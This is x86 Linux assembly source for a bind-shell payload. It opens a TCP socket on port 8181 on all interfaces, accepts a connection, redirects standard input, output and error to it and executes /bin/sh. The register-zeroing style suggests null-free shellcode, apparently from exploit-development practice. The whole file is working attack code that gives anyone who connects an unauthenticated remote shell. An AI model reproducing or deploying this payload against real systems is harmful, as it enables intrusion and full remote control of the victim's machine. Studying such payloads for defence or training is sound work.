	global _start

	section .text
_start:
	;; socket
	xor	eax,eax		; eax=0
	add	eax,359		; eax=359
	xor	ebx,ebx		; ebx=0
	add	ebx,2		; ebx=2(AF_INET)
	xor	ecx,ecx		; ecx=0
	add	ecx,1		; ecx=1(SOCK_STREAM)
	xor	edx,edx		; edx=0(IPPROTO_TCP)
	int	0x80
	
	;; save server socket
	mov	ebx,eax		; ebx=eax=socket_fd

	;; socket variables
	xor	eax,eax		; eax=0(INADDR_ANY)
	;; add	eax,0x0100007f	; eax=127.0.0.1
	push	eax		; push eax
	push 	word 0xf51f	; push 8181(PORT)
	push	word 0x02	; push 2(AF_INET)

	;; bind
	mov 	ecx,esp		; ecx=sockaddr_in
	xor	eax,eax		; eax=0
	add	eax,361		; eax=361
	xor	edx,edx		; edx=0
	add	edx,16		; edx=16
	int	0x80

	;; listen
	xor	eax,eax		; eax=0
	add	eax,363		; eax=363
	xor	ecx,ecx		; ecx=0
	add	ecx,1		; ecx=1
	int	0x80

	;; accept4
	xor	eax,eax		; eax=0
	add	eax,364		; eax=364
	xor	ecx,ecx		; ecx=NULL
	xor	edx,edx		; edx=NULL
	xor	esi,esi		; esi=0
	int	0x80

	;; save client socket
	mov	ebx,eax		; ebx=eax=client socket_fd

	;; dup2(stdin)
	xor	eax,eax		; eax=0
	add	eax,63		; eax=63
	xor	ecx,ecx		; ecx=0
	int	0x80

	;; dup2(stdout)
	xor	eax,eax		; eax=0
	add	eax,63		; eax=63
	xor	ecx,ecx		; ecx=0
	add	ecx,1		; ecx=1
	int	0x80

	;; dup2(stderr)
	xor	eax,eax		; eax=0
	add	eax,63		; eax=63
	xor	ecx,ecx		; ecx=0
	add	ecx,2		; ecx=2
	int	0x80

	;; execve
	xor	edx,edx		; edx=NULL
	push	edx		; push NULL
	push	0x68732f2f	; eax='//sh'
	push	0x6e69622f	; eax='/bin'
	lea	eax,[edx+11]	; execve syscall no.
	mov	ebx,esp		; ebx='/bin/sh\0'
	push	edx		; push NULL
	push	ebx		; push '/bin/sh/\0'
	mov	ecx,esp		; ecx=['/bin/sh\0', NULL]
	int	0x80
